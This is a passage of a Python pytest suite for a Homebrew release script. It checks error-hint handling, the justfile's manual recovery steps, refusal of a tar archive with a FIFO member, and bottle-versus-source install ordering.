        raise release.ReleaseError("tap working tree is dirty: /tmp/tap")

    monkeypatch.setattr(release, "brew_install_and_test", boom)
    with pytest.raises(release.ReleaseError) as caught:
        release.main(["--version", cut.version, "--skip-tests"])
    message = str(caught.value)
    assert message.startswith("tap working tree is dirty: /tmp/tap"), message
    assert "ReleaseError" not in message


@pytest.mark.parametrize(
    ("kind", "keeps_its_own_route"),
    [("flagged", True), ("quoting", False), ("os_error", False)],
    ids=["flagged", "merely_quoting", "os_error_quoting"],
)
def test_a_bottle_failure_does_not_double_a_hint_the_inner_error_already_carried(
    monkeypatch, release, cut, tmp_path, kind, keeps_its_own_route
):
    """`fetch_bottle` composes its own hint onto whatever it caught, and the
    error it can catch with a hint already on it is reachable: the
    `source.sha256` comparison is the run's FIRST archive download, so
    `archive_facts` exhausting its attempts raises a ReleaseError ending in
    RESUME_BY_HAND_HINT.

    `main`'s guard structurally cannot fix this -- the composition happens
    before it sees anything, so it correctly re-raises untouched -- which is
    why the guard has to be at the inner wrap too (adversary F1, 2026-10-23).
    Here the appended bottle route is the MORE wrong of the two, because what
    failed was a source download.

    The three cases pin that the guard reads the FLAG and not the message, at
    this site as well as at `main`'s: an error that merely quotes a hint, and a
    non-ReleaseError that quotes one, both still need the bottle route. A
    substring test here stripped it from any `bottle_entry` validation failure
    whose echoed field value contained the sentence (adversary F1 and F2, ninth
    review, 2026-10-23).
    """
    detail = "could not fetch the archive after 5 attempts: connection reset. "
    if kind == "os_error":
        inner = OSError(detail + release.RESUME_BY_HAND_HINT)
    else:
        inner = release.ReleaseError(
            detail + release.RESUME_BY_HAND_HINT,
            self_sufficient=kind == "flagged",
        )

    def boom(*_a, **_k):
        raise inner

    # Injected at the first call inside the try rather than at
    # `archive_sha256`, because reaching that line needs the whole artifact
    # pipeline to succeed first -- the earlier version of this test raised a
    # FileNotFoundError on the missing source.sha256 instead and so proved
    # nothing about the guard. The guard covers the whole `except`, and the
    # reachable producer of a hint-carrying inner error is documented at the
    # guard itself.
    monkeypatch.setattr(release, "output", lambda argv, **kwargs: "deadbeef")
    monkeypatch.setattr(release, "find_run", boom)

    with pytest.raises(release.ReleaseError) as caught:
        release.fetch_bottle(cut, tmp_path, dry_run=False)
    message = str(caught.value)
    if keeps_its_own_route:
        assert message.count("already published") == 1, message
        assert release.BOTTLE_FALLBACK_HINT not in message
    else:
        # Not self-sufficient, so the bottle route is appended exactly once.
        assert release.BOTTLE_FALLBACK_HINT in message, message
        assert "no usable macOS bottle" in message


def test_the_real_archive_download_failing_is_not_given_the_bottle_route(
    monkeypatch, release, cut, tmp_path
):
    """The producer the docstring above names, run for real.

    Every other test of `fetch_bottle`'s guard injects a pre-flagged error at
    `find_run`, a stub standing in for the raise site -- the fifth time the
    unpinned thing was the line a stub replaces. Here only the network is
    replaced: the real `archive_sha256` reaches the real `archive_facts`, which
    exhausts its retries and raises the real hint-carrying ReleaseError, and
    `fetch_bottle` has to pass it through. Moving that hint into a local, or
    dropping `self_sufficient=True` at the raise site, restores the doubled
    "already published" with two conflicting routes -- a syntactic check on
    the AST test could not tell (adversary G2, A9, tenth review, 2026-10-23).
    """
    real_archive_sha256 = release.archive_sha256
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
    )
    monkeypatch.setattr(release, "archive_sha256", real_archive_sha256)

    def reset(*_args, **_kwargs):
        raise urllib.error.URLError("connection reset")

    monkeypatch.setattr(release._OPENER, "open", reset)
    monkeypatch.setattr(release.time, "sleep", lambda _s: None)

    with pytest.raises(release.ReleaseError) as caught:
        release.fetch_bottle(cut, tmp_path, dry_run=False)
    message = str(caught.value)
    assert "could not fetch" in message, message
    assert message.count("already published") == 1, message
    assert release.BOTTLE_FALLBACK_HINT not in message
    assert "no usable macOS bottle" not in message


def _hint_tail(hint):
    """The literal text a hint ends with: after the last `{placeholder}` of one
    that is used with `.format`, else the whole of it."""
    return hint.rsplit("}", 1)[-1] if "}" in hint else hint


def _audit_error(hints, message, flagged):
    """True when the flag agrees with the message: a self-sufficient error ENDS
    in one of the hints (they are always appended last), and one that does not
    is not flagged. An error that merely QUOTES a hint mid-message, as
    `bottle_entry` does when it echoes a rejected field, is not a carrier."""
    ends = any(message.endswith(_hint_tail(hint)) for hint in hints)
    return flagged == ends


def test_the_error_audit_rejects_both_disagreements_and_accepts_a_quote():
    hints = ["do not re-run -- finish by hand.", "build locally {keg} (see caveats)."]
    assert _audit_error(hints, "boom. do not re-run -- finish by hand.", True)
    assert _audit_error(hints, "boom. build locally X (see caveats).", True)
    assert _audit_error(hints, "boom", False)
    # A false flag: silence, no route.
    assert not _audit_error(hints, "boom", True)
    # A hint with no flag: a second, conflicting hint is appended later.
    assert not _audit_error(hints, "boom. do not re-run -- finish by hand.", False)
    # The hint quoted inside a rejected value is not a hint carried.
    assert _audit_error(
        hints, "bad path 'do not re-run -- finish by hand.' here", False
    )


@pytest.fixture(autouse=True)
def _every_release_error_built_by_release_py_agrees_with_its_hint(release):
    """Behavioural twin of the AST test. Syntax can be dodged (a hint built in a
    helper, an alias constant, a subclass, a computed flag: sixteen such edits
    passed 145 tests in the eleventh review, 2026-10-23); this asks what each
    error release.py actually constructs while a test runs says and declares."""
    module = release
    hints = [getattr(module, name) for name in dir(module) if name.endswith("_HINT")]
    real_init = module.ReleaseError.__init__
    problems = []
    built = []

    def checked(self, *args, **kwargs):
        real_init(self, *args, **kwargs)
        caller = sys._getframe(1).f_code.co_filename
        if caller == str(RELEASE_PY) and args:
            built.append((self, str(args[0])))
            if not _audit_error(hints, str(args[0]), self.self_sufficient):
                problems.append((str(args[0])[-80:], self.self_sufficient))

    module.ReleaseError.__init__ = checked
    yield
    # The guards read the flag when they CATCH the error, not when it is built,
    # so audit every instance again with the flag it has now: this sees a write
    # in any syntax (adversary X1 and V1-W5, twelfth and thirteenth reviews).
    # Both halves are read now: the message too, since `error.args = ...` can
    # drop the hint after construction.
    for error, message in built:
        current = str(error.args[0]) if error.args else message
        if not _audit_error(hints, current, error.self_sufficient):
            problems.append((current[-80:], error.self_sufficient))
    assert problems == [], f"flag and message disagree: {problems}"


def test_the_tag_only_hint_and_the_justfile_rule_it_points_at_stay_together(release):
    """`RESUME_TAG_ONLY_HINT` sends the operator to a rule in the justfile, and
    that rule is keyed on a sentence release.py prints. If either drifts the
    operator is pointed at a rule that no longer exists, or follows the
    post-publication one, whose `brew reinstall` pours the PREVIOUS release's
    bottle in this state. Reverting the hint to its 2efe431 wording, and
    deleting the justfile bullet, both passed 143 tests (adversary G4, A16 and
    A17, tenth review, 2026-10-23).
    """
    hint = release.RESUME_TAG_ONLY_HINT
    assert "gh release view" in hint
    assert f"--repo {release.FORK_REPO}" in hint
    assert "do not re-run `just release`" in hint
    # The rule it names, not the post-publication one that pours the previous
    # bottle (adversary J3, eleventh review, 2026-10-23).
    assert "'no formula commit yet' rule" in hint
    # Not the post-publication wording, which claims the Release exists.
    assert "Release are already published" not in hint
    justfile = (ROOT / "justfile").read_text(encoding="utf-8")
    sentence = (
        "The tag is pushed, but release.py did not see `gh release create` succeed"
    )
    assert sentence in hint
    # The justfile wraps its comment lines, so compare with the comment
    # markers and line breaks removed -- and only inside THIS bullet, which
    # ends at the next `# - ` line of the raw file, so a phrase cannot migrate
    # to a neighbouring bullet and still satisfy the pin (adversary F4b and K8).
    raw = justfile.splitlines()
    starts = [i for i, line in enumerate(raw) if line.startswith("# - ")]
    bounds = [
        *starts[1:],
        next(
            i
            for i, line in enumerate(raw)
            if not line.startswith("#") and i > starts[0]
        ),
    ]
    bullets = [
        " ".join(line.removeprefix("#").strip() for line in raw[a:b])
        for a, b in zip(starts, bounds, strict=False)
    ]
    holding = [b for b in bullets if sentence in b]
    assert len(holding) == 1, len(holding)
    bullet = holding[0]
    assert "no formula commit yet" in bullet
    # Steps in order; the operator reads them top to bottom.
    marks = [bullet.index(f" {n}. ") for n in range(1, 6)]
    assert marks == sorted(marks), marks
    end = len(bullet)
    step1, step2, step3, step4, step5 = (
        bullet[marks[i] : marks[i + 1] if i < 4 else end] for i in range(5)
    )
    fork = release.FORK_REPO
    # Step 1 is the command the hint promises the rule starts with.
    assert f"`gh release view <tag> --repo {fork}`" in step1
    # Every command the operator copies names the fork explicitly. Only the
    # bare mention of the command the sentence quotes is exempt, by exact text:
    # no word-count or prefix exemption (K3, K4, K13).
    # Pair the backticks first and look inside every span, so a command that
    # does not START with `gh ` (an env prefix, `git fetch && gh ...`) is seen
    # (adversary B1, B2, fourteenth review).
    spans = re.findall(r"`([^`]*)`", bullet)
    commands = [span for span in spans if re.search(r"\bgh ", span)]
    assert len(commands) >= 4, commands
    for command in commands:
        if command == "gh release create":
            continue
        assert command.startswith(("gh ", "title=")), command
        assert f"--repo {fork}" in command, command
        assert "{owner}" not in command and "cachix" not in command, command
        assert not command.startswith(("gh release upload", "gh api")), command
    # The title is read and checked in ONE chain with the create, so an empty
    # title stops it (an `|| echo` guard returns 0 and the create still runs:
    # adversary F4, thirteenth review).
    chain = (
        "title=$(git tag -l --format='%(contents:subject)' <tag>) && test -n "
        '"$title" && gh release create <tag> --verify-tag --repo '
        f'{fork} --title "$title" --notes-file <notes>'
    )
    # The whole span, not a substring of it: a fallback appended inside the
    # same backticks would run exactly when the guard fires (adversary B3).
    assert f"`{chain}`" in step2, step2
    assert "|| echo" not in step2
    # Nothing tells the operator to upload assets by hand.
    assert "Never upload assets by hand" in step3
    assert "gh release upload" not in bullet
    # Step 4 names the checks the hand route has to reproduce, in order, and
    # the one-download condition they depend on.
    names = [
        "fetch_bottle",
        "update_formula_commit",
        "require_archive_matches_tag",
        "sync_tap",
        "merge_bottle",
        "verify_release_assets",
    ]
    at = [step4.index(name) for name in names]
    assert at == sorted(at), dict(zip(names, at))
    assert "In `_release_body` order" in step4
    assert "ONE download" in step4
    assert "gh attestation verify" in step4
    # `verify_readback` requires the NEW engine installed, so it comes after the
    # install in step 5, never in step 4 (adversary F3).
    assert "verify_readback" in step5 and "verify_readback" not in step4


def test_a_bottle_json_quoting_a_hint_still_gets_the_bottle_route(
    monkeypatch, release, cut, tmp_path
):
    """The reachable false positive the substring guard had, end to end.

    `bottle_entry` reports every bottle-JSON validation failure by echoing the
    rejected value, so a `formula.path` carrying the sentence "finish by hand
    per the justfile RESUME RULES" produced a ReleaseError whose text matched
    the registry -- and `fetch_bottle` re-raised it with no
    BOTTLE_FALLBACK_HINT and without the "no usable macOS bottle" framing. The
    bottle job's filesystem stays writable between build and attest (see
    `fetch_bottle`), so the JSON's content is attacker-reachable and could
    choose which recovery route the operator was shown (adversary F1, ninth
    review, 2026-10-23).

    This test fails on the substring guard and passes on the flag.
    """
    quoted = f"Library/Taps/x/y/Formula/z.rb -- {release.RESUME_BY_HAND_HINT}"
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        doc=bottle_json(release, cut, path=quoted),
    )
    with pytest.raises(release.ReleaseError) as caught:
        release.fetch_bottle(cut, tmp_path, dry_run=False)
    message = str(caught.value)
    assert "formula path" in message, message
    assert release.BOTTLE_FALLBACK_HINT in message, message
    assert "no usable macOS bottle" in message


def test_an_unfingerprintable_tree_logs_what_actually_went_wrong(
    release, tmp_path, capsys
):
    """The caller's `_require` can only offer three causes at once -- "not a
    single prefixed directory, or a refused member, or could not be
    fingerprinted" -- attack first and accident last, for what is usually
    neither: v0.19.1-sudo.15 ran out of disk after publishing.

    Nothing held this log line in place (mutation M14 deleted it and all 126
    tests still passed), and the type is the point: `OSError` reads very
    differently from `SpecialFileError` (adversary F2 and F3.3, 2026-10-23).
    """
    missing = tmp_path / "not-there.tar.gz"
    assert release.extracted_tree(missing, prefix="root") is None
    out = capsys.readouterr().out
    assert "cannot fingerprint" in out, out
    assert "FileNotFoundError" in out, out


def test_a_special_file_member_is_refused_so_the_filter_choice_is_pinned(
    release, tmp_path
):
    """`filter="data"` and `filter="tar"` both refuse `..`, so the traversal
    test cannot tell them apart -- swapping `data` for `tar` was an undetected
    one-token mutation (adversary F4, 2026-10-23).

    A special file is the difference the docstring and the operator-facing
    message both claim: `tar` extracts a FIFO happily, and since
    `tree_entries` records neither FIFOs nor directories it would be invisible
    in the fingerprint. `data` raises SpecialFileError.
    """
    evil = tmp_path / "fifo.tar.gz"
    with tarfile.open(evil, "w:gz") as tf:
        member = tarfile.TarInfo("root/pipe")
        member.type = tarfile.FIFOTYPE
        tf.addfile(member)
        body = b"ordinary\n"
        plain = tarfile.TarInfo("root/plain.txt")
        plain.size = len(body)
        tf.addfile(plain, io.BytesIO(body))

    assert release.extracted_tree(evil, prefix="root") is None


@pytest.mark.parametrize("flags", [[], ["--build-from-source"]])
def test_main_pours_the_bottle_unless_told_to_build_from_source(
    monkeypatch, release, cut, flags
):
    seen = []
    monkeypatch.setattr(release, "preflight", lambda _release, **kwargs: None)
    monkeypatch.setattr(release, "run", lambda argv, **kwargs: completed(argv))
    monkeypatch.setattr(
        release, "fetch_bottle", lambda *a, **k: seen.append("fetch") or []
    )
    monkeypatch.setattr(release, "merge_bottle", lambda *a, **k: seen.append("merge"))
    monkeypatch.setattr(release, "sync_tap", lambda *a, **k: seen.append("sync"))
    monkeypatch.setattr(
        release,
        "brew_install_and_test",
        lambda **k: seen.append(f"install source={k['build_from_source']}") or "p",
    )
    release.main(["--version", cut.version, "--dry-run", "--skip-tests", *flags])
    if flags:
        assert seen == ["sync", "install source=True"]
    else:
        # The bottle is awaited before the tap moves, merged after it.
        assert seen == ["fetch", "sync", "merge", "install source=False"]
